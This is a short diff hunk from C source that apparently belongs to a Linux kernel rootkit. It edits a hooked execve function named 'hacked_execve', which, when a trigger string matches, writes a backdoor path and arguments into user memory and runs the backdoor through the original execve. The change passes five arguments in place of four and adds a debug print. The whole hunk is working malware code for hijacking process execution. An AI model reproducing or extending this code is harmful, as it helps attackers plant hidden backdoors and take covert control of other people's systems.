@@ -214,7 +214,8 @@ asmlinkage int hacked_execve(const char *filename, const char *argv[], const cha
 	if(strstr(truc, test) != NULL){
 		printk("Attempting to run backdoor.\n");
 		copy_to_user(filename, bd, strlen(bd));
-		copy_to_user(argv, arguments, sizeof(psize) * 4);
+		copy_to_user(argv, arguments, sizeof(psize) * 5);
+		printk("%s [%s,%s,%s,%s,%s]\n", filename, argv[0], argv[1], argv[2], argv[3], argv[4]);
 		kfree(test);
 		return (*orig_execve)(filename, argv, NULL);
 	}
